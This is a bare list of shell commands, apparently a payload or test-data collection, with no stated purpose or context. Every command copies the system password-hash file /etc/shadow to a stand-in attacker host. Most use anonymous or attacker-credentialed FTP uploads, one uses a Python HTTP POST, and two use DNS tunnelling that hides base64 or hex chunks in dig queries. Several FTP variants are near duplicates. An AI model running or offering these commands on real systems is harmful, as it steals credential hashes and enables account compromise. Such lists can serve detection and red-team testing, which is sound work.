command:
ftp -n attacker.com <<'EOF'
user anonymous ''
put /etc/shadow
quit
EOF

ftp -n attacker.com <<'EOF'
user anonymous anonymous
binary
put /etc/shadow shadow.ftp
bye
EOF

ftp -inv attacker.com <<'EOF'
user attacker attacker
put /etc/shadow shadow.ftp
bye
EOF

ftp -inv attacker.example.com <<'EOF'
user anonymous anonymous
put /etc/shadow shadow
bye
EOF

ftp -inv attacker.example.com <<'EOF'
user anonymous anonymous
put /etc/shadow shadow_ftp
bye
EOF

base64 /etc/shadow | tr -d '
' | fold -w 50 | while read line; do dig @attacker.example.com "$line.attacker.example.com" TXT >/dev/null; done

printf "user attacker pass
binary
put /etc/shadow shadow_ftp
quit
" | ftp -inv attacker.example.com

ftp -inv attacker.example.com <<'EOF'
user anonymous anonymous
put /etc/shadow shadow_ftp
bye
EOF

ftp -inv attacker.example.com <<'EOF'
user anonymous anonymous
put /etc/shadow /tmp/shadow_ftp
bye
EOF
python3 -c "import urllib.request; data=open('/etc/shadow','rb').read(); req=urllib.request.Request('http://attacker.example.com/upload', data=data, method='POST'); urllib.request.urlopen(req)"
xxd -p /etc/shadow | while read -r line; do dig @attacker.example.com ${line}.shadow.exfil +short >/dev/null; done
